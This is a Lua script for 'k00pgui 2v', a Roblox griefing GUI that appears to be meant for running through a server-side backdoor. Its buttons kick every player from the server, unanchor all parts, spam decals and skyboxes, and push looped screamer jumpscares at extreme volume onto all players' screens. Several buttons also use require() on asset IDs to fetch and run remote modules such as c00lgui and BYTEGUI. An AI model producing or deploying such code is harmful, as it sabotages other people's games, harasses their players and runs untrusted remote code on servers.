-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local ScrollingFrame = Instance.new("ScrollingFrame")
local Title = Instance.new("TextLabel")
local Title_2 = Instance.new("TextLabel")
local Title_3 = Instance.new("TextLabel")
local Title_4 = Instance.new("TextLabel")
local Title_5 = Instance.new("TextLabel")
local Decalspam1 = Instance.new("TextButton")
local Musicplay = Instance.new("TextButton")
local hint = Instance.new("TextButton")
local _666 = Instance.new("TextButton")
local Unanchor = Instance.new("TextButton")
local Shutdown = Instance.new("TextButton")
local disco = Instance.new("TextButton")
local Particles = Instance.new("TextButton")
local jumpscare = Instance.new("TextButton")
local stopmusic = Instance.new("TextButton")
local destroy = Instance.new("TextButton")
local ss1 = Instance.new("TextButton")
local ss2 = Instance.new("TextButton")
local ss3 = Instance.new("TextButton")
local flag = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

ScrollingFrame.Parent = ScreenGui
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 89, 29)
ScrollingFrame.BorderSizePixel = 3
ScrollingFrame.Position = UDim2.new(0.0700218678, 0, 0.49818182, 0)
ScrollingFrame.Size = UDim2.new(0, 581, 0, 381)

Title.Name = "Title"
Title.Parent = ScrollingFrame
Title.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
Title.BorderColor3 = Color3.fromRGB(12, 53, 6)
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0.0859276503, 0, 0.00530304015, 0)
Title.Size = UDim2.new(0, 480, 0, 50)
Title.Font = Enum.Font.SourceSans
Title.Text = "k00pgui 2v"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 40.000
Title.TextWrapped = true

Title_2.Name = "Title"
Title_2.Parent = Title
Title_2.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
Title_2.BorderColor3 = Color3.fromRGB(12, 53, 6)
Title_2.BorderSizePixel = 0
Title_2.Position = UDim2.new(0.129268095, 0, 0.991363645, 0)
Title_2.Size = UDim2.new(0, 380, 0, 14)
Title_2.Font = Enum.Font.SourceSans
Title_2.Text = "Inspired by BYTEGUI (made by team k00pkidd)"
Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_2.TextScaled = true
Title_2.TextSize = 40.000
Title_2.TextWrapped = true

Title_3.Name = "Title"
Title_3.Parent = Title_2
Title_3.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
Title_3.BorderColor3 = Color3.fromRGB(12, 53, 6)
Title_3.BorderSizePixel = 0
Title_3.Position = UDim2.new(0.0976891741, 0, 11.348506, 0)
Title_3.Size = UDim2.new(0, 257, 0, 17)
Title_3.Font = Enum.Font.SourceSans
Title_3.Text = "Extra"
Title_3.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_3.TextScaled = true
Title_3.TextSize = 40.000
Title_3.TextWrapped = true

Title_4.Name = "Title"
Title_4.Parent = Title_3
Title_4.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
Title_4.BorderColor3 = Color3.fromRGB(12, 53, 6)
Title_4.BorderSizePixel = 0
Title_4.Position = UDim2.new(-0.00347813871, 0, 9.17203426, 0)
Title_4.Size = UDim2.new(0, 257, 0, 17)
Title_4.Font = Enum.Font.SourceSans
Title_4.Text = "SS Scripts"
Title_4.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_4.TextScaled = true
Title_4.TextSize = 40.000
Title_4.TextWrapped = true

Title_5.Name = "Title"
Title_5.Parent = Title_4
Title_5.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
Title_5.BorderColor3 = Color3.fromRGB(12, 53, 6)
Title_5.BorderSizePixel = 0
Title_5.Position = UDim2.new(0.00819501281, 0, 4.99556398, 0)
Title_5.Size = UDim2.new(0, 257, 0, 17)
Title_5.Font = Enum.Font.SourceSans
Title_5.Text = "Epok tr0lls!111"
Title_5.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_5.TextScaled = true
Title_5.TextSize = 40.000
Title_5.TextWrapped = true

Decalspam1.Name = "Decalspam1"
Decalspam1.Parent = Title
Decalspam1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Decalspam1.BorderColor3 = Color3.fromRGB(5, 54, 0)
Decalspam1.BorderSizePixel = 2
Decalspam1.Position = UDim2.new(-0.0170997158, 0, 1.4345454, 0)
Decalspam1.Size = UDim2.new(0, 147, 0, 47)
Decalspam1.Font = Enum.Font.SourceSans
Decalspam1.Text = "Decal Spam 1"
Decalspam1.TextColor3 = Color3.fromRGB(255, 255, 255)
Decalspam1.TextScaled = true
Decalspam1.TextSize = 14.000
Decalspam1.TextWrapped = true

Musicplay.Name = "Musicplay"
Musicplay.Parent = Title
Musicplay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Musicplay.BorderColor3 = Color3.fromRGB(5, 54, 0)
Musicplay.BorderSizePixel = 2
Musicplay.Position = UDim2.new(0.32456696, 0, 1.4345454, 0)
Musicplay.Size = UDim2.new(0, 147, 0, 47)
Musicplay.Font = Enum.Font.SourceSans
Musicplay.Text = "Music Play"
Musicplay.TextColor3 = Color3.fromRGB(255, 255, 255)
Musicplay.TextScaled = true
Musicplay.TextSize = 14.000
Musicplay.TextWrapped = true

hint.Name = "hint"
hint.Parent = Title
hint.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
hint.BorderColor3 = Color3.fromRGB(5, 54, 0)
hint.BorderSizePixel = 2
hint.Position = UDim2.new(0.66831696, 0, 1.4345454, 0)
hint.Size = UDim2.new(0, 147, 0, 47)
hint.Font = Enum.Font.SourceSans
hint.Text = "Hint"
hint.TextColor3 = Color3.fromRGB(255, 255, 255)
hint.TextScaled = true
hint.TextSize = 14.000
hint.TextWrapped = true

_666.Name = "666"
_666.Parent = Title
_666.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
_666.BorderColor3 = Color3.fromRGB(5, 54, 0)
_666.BorderSizePixel = 2
_666.Position = UDim2.new(-0.017099686, 0, 2.97454548, 0)
_666.Size = UDim2.new(0, 147, 0, 47)
_666.Font = Enum.Font.SourceSans
_666.Text = "666"
_666.TextColor3 = Color3.fromRGB(255, 255, 255)
_666.TextScaled = true
_666.TextSize = 14.000
_666.TextWrapped = true

Unanchor.Name = "Unanchor"
Unanchor.Parent = Title
Unanchor.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Unanchor.BorderColor3 = Color3.fromRGB(5, 54, 0)
Unanchor.BorderSizePixel = 2
Unanchor.Position = UDim2.new(0.322483659, 0, 2.97454548, 0)
Unanchor.Size = UDim2.new(0, 147, 0, 47)
Unanchor.Font = Enum.Font.SourceSans
Unanchor.Text = "UnAnchor Parts"
Unanchor.TextColor3 = Color3.fromRGB(255, 255, 255)
Unanchor.TextScaled = true
Unanchor.TextSize = 14.000
Unanchor.TextWrapped = true

Shutdown.Name = "Shutdown"
Shutdown.Parent = Title
Shutdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Shutdown.BorderColor3 = Color3.fromRGB(5, 54, 0)
Shutdown.BorderSizePixel = 2
Shutdown.Position = UDim2.new(0.66831696, 0, 2.97454548, 0)
Shutdown.Size = UDim2.new(0, 147, 0, 47)
Shutdown.Font = Enum.Font.SourceSans
Shutdown.Text = "Shutdown"
Shutdown.TextColor3 = Color3.fromRGB(255, 255, 255)
Shutdown.TextScaled = true
Shutdown.TextSize = 14.000
Shutdown.TextWrapped = true

disco.Name = "disco"
disco.Parent = Title
disco.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
disco.BorderColor3 = Color3.fromRGB(5, 54, 0)
disco.BorderSizePixel = 2
disco.Position = UDim2.new(-0.0170996785, 0, 4.79454565, 0)
disco.Size = UDim2.new(0, 147, 0, 47)
disco.Font = Enum.Font.SourceSans
disco.Text = "Disco"
disco.TextColor3 = Color3.fromRGB(255, 255, 255)
disco.TextScaled = true
disco.TextSize = 14.000
disco.TextWrapped = true

Particles.Name = "Particles"
Particles.Parent = Title
Particles.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Particles.BorderColor3 = Color3.fromRGB(5, 54, 0)
Particles.BorderSizePixel = 2
Particles.Position = UDim2.new(0.326650321, 0, 4.79454565, 0)
Particles.Size = UDim2.new(0, 147, 0, 47)
Particles.Font = Enum.Font.SourceSans
Particles.Text = "Particles"
Particles.TextColor3 = Color3.fromRGB(255, 255, 255)
Particles.TextScaled = true
Particles.TextSize = 14.000
Particles.TextWrapped = true

jumpscare.Name = "jumpscare"
jumpscare.Parent = Title
jumpscare.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
jumpscare.BorderColor3 = Color3.fromRGB(5, 54, 0)
jumpscare.BorderSizePixel = 2
jumpscare.Position = UDim2.new(0.666233659, 0, 4.79454565, 0)
jumpscare.Size = UDim2.new(0, 147, 0, 47)
jumpscare.Font = Enum.Font.SourceSans
jumpscare.Text = "Jumpscare FE"
jumpscare.TextColor3 = Color3.fromRGB(255, 255, 255)
jumpscare.TextScaled = true
jumpscare.TextSize = 14.000
jumpscare.TextWrapped = true

stopmusic.Name = "stopmusic"
stopmusic.Parent = Title
stopmusic.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
stopmusic.BorderColor3 = Color3.fromRGB(5, 54, 0)
stopmusic.BorderSizePixel = 2
stopmusic.Position = UDim2.new(-0.060849756, 0, -0.00545477867, 0)
stopmusic.Size = UDim2.new(0, 91, 0, 20)
stopmusic.Font = Enum.Font.SourceSans
stopmusic.Text = "Stop Music"
stopmusic.TextColor3 = Color3.fromRGB(255, 255, 255)
stopmusic.TextScaled = true
stopmusic.TextSize = 14.000
stopmusic.TextWrapped = true

destroy.Name = "destroy"
destroy.Parent = Title
destroy.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
destroy.BorderColor3 = Color3.fromRGB(5, 54, 0)
destroy.BorderSizePixel = 2
destroy.Position = UDim2.new(-0.017099699, 0, 6.21454525, 0)
destroy.Size = UDim2.new(0, 476, 0, 47)
destroy.Font = Enum.Font.SourceSans
destroy.Text = "Destroy Complete (ONLY FOR EMERGENCY)"
destroy.TextColor3 = Color3.fromRGB(255, 255, 255)
destroy.TextScaled = true
destroy.TextSize = 14.000
destroy.TextWrapped = true

ss1.Name = "ss1"
ss1.Parent = Title
ss1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ss1.BorderColor3 = Color3.fromRGB(5, 54, 0)
ss1.BorderSizePixel = 2
ss1.Position = UDim2.new(-0.0170996785, 0, 7.75454617, 0)
ss1.Size = UDim2.new(0, 147, 0, 47)
ss1.Font = Enum.Font.SourceSans
ss1.Text = "c00lgui"
ss1.TextColor3 = Color3.fromRGB(255, 255, 255)
ss1.TextScaled = true
ss1.TextSize = 14.000
ss1.TextWrapped = true

ss2.Name = "ss2"
ss2.Parent = Title
ss2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ss2.BorderColor3 = Color3.fromRGB(5, 54, 0)
ss2.BorderSizePixel = 2
ss2.Position = UDim2.new(0.326650321, 0, 7.75454617, 0)
ss2.Size = UDim2.new(0, 147, 0, 47)
ss2.Font = Enum.Font.SourceSans
ss2.Text = "game cursor gui"
ss2.TextColor3 = Color3.fromRGB(255, 255, 255)
ss2.TextScaled = true
ss2.TextSize = 14.000
ss2.TextWrapped = true

ss3.Name = "ss3"
ss3.Parent = Title
ss3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ss3.BorderColor3 = Color3.fromRGB(5, 54, 0)
ss3.BorderSizePixel = 2
ss3.Position = UDim2.new(0.666233659, 0, 7.75454617, 0)
ss3.Size = UDim2.new(0, 147, 0, 47)
ss3.Font = Enum.Font.SourceSans
ss3.Text = "BYTEGUI"
ss3.TextColor3 = Color3.fromRGB(255, 255, 255)
ss3.TextScaled = true
ss3.TextSize = 14.000
ss3.TextWrapped = true

flag.Name = "flag"
flag.Parent = Title
flag.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
flag.BorderColor3 = Color3.fromRGB(5, 54, 0)
flag.BorderSizePixel = 2
flag.Position = UDim2.new(-0.019183049, 0, 9.33454514, 0)
flag.Size = UDim2.new(0, 147, 0, 47)
flag.Font = Enum.Font.SourceSans
flag.Text = "Funni German Flag Skybox"
flag.TextColor3 = Color3.fromRGB(255, 255, 255)
flag.TextScaled = true
flag.TextSize = 14.000
flag.TextWrapped = true

-- Scripts:

local function LQCL_fake_script() -- ScrollingFrame.Drag Gui Script 
	local script = Instance.new('LocalScript', ScrollingFrame)

	function dragify(Main)
	dragToggle = nil
	dragSpeed = 0.95 -- You can edit this.
	dragInput = nil
	dragStart = nil
	dragPos = nil
	
	function updateInput(input)
	Delta = input.Position - dragStart
	Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	game:GetService("TweenService"):Create(Main, TweenInfo.new(.25), {Position = Position}):Play()
	end
	
	Main.InputBegan:Connect(function(input)
	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
	dragToggle = true
	dragStart = input.Position
	startPos = Main.Position
	input.Changed:Connect(function()
	if (input.UserInputState == Enum.UserInputState.End) then
	dragToggle = false
	end
	end)
	end
	end)
	
	Main.InputChanged:Connect(function(input)
	if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
	dragInput = input
	end
	end)
	
	game:GetService("UserInputService").InputChanged:Connect(function(input)
	if (input == dragInput and dragToggle) then
	updateInput(input)
	end
	end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(LQCL_fake_script)()
local function EGNFAEB_fake_script() -- Decalspam1.Script 
	local script = Instance.new('Script', Decalspam1)

	function click()
		s = Instance.new("Sky")
		s.Name = "Sky"
		s.Parent = game.Lighting
		s.SkyboxBk = "http://www.roblox.com/asset/?id=9422866248"
		s.SkyboxDn = "http://www.roblox.com/asset/?id=9422866248"
		s.SkyboxFt = "http://www.roblox.com/asset/?id=9422866248"
		s.SkyboxLf = "http://www.roblox.com/asset/?id=9422866248"
		s.SkyboxRt = "http://www.roblox.com/asset/?id=9422866248"
		s.SkyboxUp = "http://www.roblox.com/asset/?id=9422866248"
		game.Lighting.TimeOfDay = 12
	end
	
	script.Parent.MouseButton1Down:connect(click)
end
coroutine.wrap(EGNFAEB_fake_script)()
local function OLKRHI_fake_script() -- Decalspam1.Script 
	local script = Instance.new('Script', Decalspam1)

	function click()
		function exPro(root)
			for _, v in pairs(root:GetChildren()) do
				if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id=9422866248" then
					v.Parent = nil
				elseif v:IsA("BasePart") then
					v.Material = "Plastic"
					v.Transparency = 0
					local One = Instance.new("Decal", v)
					local Two = Instance.new("Decal", v)
					local Three = Instance.new("Decal", v)
					local Four = Instance.new("Decal", v)
					local Five = Instance.new("Decal", v)
					local Six = Instance.new("Decal", v)
					One.Texture = "http://www.roblox.com/asset/?id=9422866248"
					Two.Texture = "http://www.roblox.com/asset/?id=9422866248"
					Three.Texture = "http://www.roblox.com/asset/?id=9422866248"
					Four.Texture = "http://www.roblox.com/asset/?id=9422866248"
					Five.Texture = "http://www.roblox.com/asset/?id=9422866248"
					Six.Texture = "http://www.roblox.com/asset/?id=9422866248"
					One.Face = "Front"
					Two.Face = "Back"
					Three.Face = "Right"
					Four.Face = "Left"
					Five.Face = "Top"
					Six.Face = "Bottom"
				end
				exPro(v)
			end
		end
		function asdf(root)
			for _, v in pairs(root:GetChildren()) do
				asdf(v)
			end
		end
		exPro(game.Workspace)
		asdf(game.Workspace)
	end
	
	script.Parent.MouseButton1Down:connect(click)
end
coroutine.wrap(OLKRHI_fake_script)()
local function WGLXH_fake_script() -- Musicplay.Script 
	local script = Instance.new('Script', Musicplay)

	function onClick()
		Instance.new("Sound").Parent = game.Workspace  game.Workspace.Sound.SoundId ="rbxassetid://7177681888" game.Workspace.Sound.Looped=true  game.Workspace.Sound:Play()
	end
	
	script.Parent.MouseButton1Down:connect(onClick)
end
coroutine.wrap(WGLXH_fake_script)()
local function WXIYR_fake_script() -- hint.Script 
	local script = Instance.new('Script', hint)

	script.Parent.MouseButton1Click:Connect(function()
		local m = Instance.new("Hint", game.workspace)
		m.Text = " This Game Is Doomed By Team k00pkidd & c00lkidd"
	end)
end
coroutine.wrap(WXIYR_fake_script)()
local function EYGTMT_fake_script() -- _666.Script 
	local script = Instance.new('Script', _666)

	script.Parent.MouseButton1Click:Connect(function()
		for i,v in next,workspace:children''do
			if(v:IsA'BasePart')then
				me=v;
				bbg=Instance.new('BillboardGui',me);
				bbg.Name='stuf';
				bbg.Adornee=me;
				bbg.Size=UDim2.new(2.5,0,2.5,0)
				--bbg.StudsOffset=Vector3.new(0,2,0)
				tlb=Instance.new'TextLabel';
				tlb.Text='666 666 666 666 666 666';
				tlb.Font='SourceSansBold';
				tlb.FontSize='Size48';
				tlb.TextColor3=Color3.new(1,0,0);
				tlb.Size=UDim2.new(1.25,0,1.25,0);
				tlb.Position=UDim2.new(-0.125,-22,-1.1,0);
				tlb.BackgroundTransparency=1;
				tlb.Parent=bbg;
			end;end;
		function xds(dd)
			for i,v in next,dd:children''do
				if(v:IsA'BasePart')then
					v.BrickColor=BrickColor.new'Really black';
					v.TopSurface='Smooth';
					v.BottomSurface='Smooth';
					s=Instance.new('SelectionBox',v);
					s.Adornee=v;
					s.Color=BrickColor.new'Really red';
					a=Instance.new('PointLight',v);
					a.Color=Color3.new(1,0,0);
					a.Range=15;
					a.Brightness=5;
					f=Instance.new('Fire',v);
					f.Size=19;
					f.Heat=22;
				end;
	
				local dec = 'http://www.roblox.com/asset/?id=19399245';
				local fac = {'Front', 'Back', 'Left', 'Right', 'Top', 'Bottom'}
				--coroutine.wrap(function()
				--for ,_ in pairs(fac) do
				--local ddec = Instance.new("Decal", v)
				--ddec.Face = 
				--ddec.Texture = dec
				--end end)()
				if #(v:GetChildren())>0 then
					xds(v) 
				end
			end
		end
		xds(game.Workspace)
	end)
	
end
coroutine.wrap(EYGTMT_fake_script)()
local function EXDQQ_fake_script() -- Unanchor.Script 
	local script = Instance.new('Script', Unanchor)

	script.Parent.MouseButton1Down:Connect(function()
		for i,v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("BasePart") then	
				v.Anchored = false
			end
		end
	
	
		for i,v in pairs(game.ReplicatedStorage:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Anchored = false
			end
		end
		
	
		for i,v in pairs(game.ReplicatedFirst:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Anchored = false
			end
		end
	end)
end
coroutine.wrap(EXDQQ_fake_script)()
local function PGJMH_fake_script() -- Shutdown.Script 
	local script = Instance.new('Script', Shutdown)

	script.Parent.MouseButton1Down:connect(function()
		for i, players in pairs(game.Players:GetChildren()) do
			players:Kick("Teh Game Iz Fuked Up!!!!111")
		end
	end)
	
end
coroutine.wrap(PGJMH_fake_script)()
local function ROIXGS_fake_script() -- disco.Script 
	local script = Instance.new('Script', disco)

	script.Parent.MouseButton1Click:Connect(function()
		local Lighting = game:GetService("Lighting")
		local ColorCorrection = Instance.new("ColorCorrectionEffect", Lighting)
	
		function zigzag(X) 
			return math.acos(math.cos(X*math.pi))/math.pi
		end
	
		Counter = 0
	
		Lighting.TimeOfDay = "12:00"
	
		while wait(0.1) do 
			ColorCorrection.TintColor = Color3.fromHSV(zigzag(Counter),1,1)
			Lighting.Ambient = Color3.fromHSV(zigzag(Counter),1,1)
			Counter += 0.01
		end
	end)
end
coroutine.wrap(ROIXGS_fake_script)()
local function NIMQSV_fake_script() -- Particles.Script 
	local script = Instance.new('Script', Particles)

	script.Parent.MouseButton1Click:Connect(function()
		for i, v in pairs(game.Players:GetChildren()) do
			emit = Instance.new("ParticleEmitter")
			emit.Parent = v.Character.Head
			emit.Texture = "http://www.roblox.com/asset/?id=9698929683"
			emit.VelocitySpread = 100000
		end
		end)
end
coroutine.wrap(NIMQSV_fake_script)()
local function JQMPQN_fake_script() -- jumpscare.Script 
	local script = Instance.new('Script', jumpscare)

	script.Parent.MouseButton1Click:Connect(function()
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
				spawn(function()
					local newgui = Instance.new("ScreenGui",v.PlayerGui)
					newgui.Name = "Screamer"
					local newimage = Instance.new("ImageLabel",newgui)
					newimage.Image = "http://www.roblox.com/asset/?id=9018233362"
					newimage.Size = UDim2.new(1,1,1,1)
					local s = Instance.new("Sound",newgui)
					s.SoundId = "rbxassetid://9069609200"
					s.Volume = 9999999999999999999999999999999999999
					s.Looped = true
					s:Play()
					print("Screamed "..v.Name)
					while wait(9) do
	
						newimage.Parent:Destroy()
	
					end
				end)
			end
		end
	end)
end
coroutine.wrap(JQMPQN_fake_script)()
local function GANYBB_fake_script() -- stopmusic.Script 
	local script = Instance.new('Script', stopmusic)

	function onClick()
		Instance.new("Sound").Parent = game.Workspace  game.Workspace.Sound.SoundId ="rbxassetid://0" game.Workspace.Sound.Looped=true  game.Workspace.Sound:Play()
	end
	
	script.Parent.MouseButton1Down:connect(onClick)
end
coroutine.wrap(GANYBB_fake_script)()
local function HJRZ_fake_script() -- destroy.jump 
	local script = Instance.new('Script', destroy)

	script.Parent.MouseButton1Click:Connect(function()
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
				spawn(function()
					local newgui = Instance.new("ScreenGui",v.PlayerGui)
					newgui.Name = "Screamer"
					local newimage = Instance.new("ImageLabel",newgui)
					newimage.Image = "http://www.roblox.com/asset/?id=7676654418"
					newimage.Size = UDim2.new(1,1,1,1)
					local s = Instance.new("Sound",newgui)
					s.SoundId = "rbxassetid://9069609200"
					s.Volume = 9999999999999999999999999999999999999
					s.Looped = true
					s:Play()
					print("Screamed "..v.Name)
					while wait(9) do
	
						newimage.Parent:Destroy()
	
					end
				end)
			end
		end
	end)
end
coroutine.wrap(HJRZ_fake_script)()
local function KPJPVG_fake_script() -- destroy.Script 
	local script = Instance.new('Script', destroy)

	script.Parent.RemoteEvent.OnServerEvent:Connect(function(plr)
		require(9617037720)():start()
	end)
end
coroutine.wrap(KPJPVG_fake_script)()
local function EIVP_fake_script() -- destroy.LocalScript 
	local script = Instance.new('LocalScript', destroy)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.RemoteEvent:FireServer()
	end)
end
coroutine.wrap(EIVP_fake_script)()
local function ZZMZNYG_fake_script() -- ss1.Script 
	local script = Instance.new('Script', ss1)

	script.Parent.RemoteEvent.OnServerEvent:Connect(function(plr)
		require(8946786542).load(plr.name)
	end)
	
end
coroutine.wrap(ZZMZNYG_fake_script)()
local function GXLWGVM_fake_script() -- ss1.LocalScript 
	local script = Instance.new('LocalScript', ss1)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.RemoteEvent:FireServer()
	end)
end
coroutine.wrap(GXLWGVM_fake_script)()
local function KNRPXZ_fake_script() -- ss2.Script 
	local script = Instance.new('Script', ss2)

	script.Parent.RemoteEvent.OnServerEvent:Connect(function(plr)
		require(9134953766).load(plr.name)
	end)
	
end
coroutine.wrap(KNRPXZ_fake_script)()
local function JCTKSE_fake_script() -- ss2.LocalScript 
	local script = Instance.new('LocalScript', ss2)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.RemoteEvent:FireServer()
	end)
end
coroutine.wrap(JCTKSE_fake_script)()
local function DDSB_fake_script() -- ss3.Script 
	local script = Instance.new('Script', ss3)

	script.Parent.RemoteEvent.OnServerEvent:Connect(function(plr)
		require(9497518303).BYTEGUIKYXLES(plr.name)
	end)
	
end
coroutine.wrap(DDSB_fake_script)()
local function HLOXYN_fake_script() -- ss3.LocalScript 
	local script = Instance.new('LocalScript', ss3)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.RemoteEvent:FireServer()
	end)
end
coroutine.wrap(HLOXYN_fake_script)()
local function WTXPJT_fake_script() -- flag.Script 
	local script = Instance.new('Script', flag)

	function click()
		s = Instance.new("Sky")
		s.Name = "Sky"
		s.Parent = game.Lighting
		s.SkyboxBk = "http://www.roblox.com/asset/?id=7676654418"
		s.SkyboxDn = "http://www.roblox.com/asset/?id=7676654418"
		s.SkyboxFt = "http://www.roblox.com/asset/?id=7676654418"
		s.SkyboxLf = "http://www.roblox.com/asset/?id=7676654418"
		s.SkyboxRt = "http://www.roblox.com/asset/?id=7676654418"
		s.SkyboxUp = "http://www.roblox.com/asset/?id=7676654418"
		game.Lighting.TimeOfDay = 12
	end
	
	script.Parent.MouseButton1Down:connect(click)
end
coroutine.wrap(WTXPJT_fake_script)()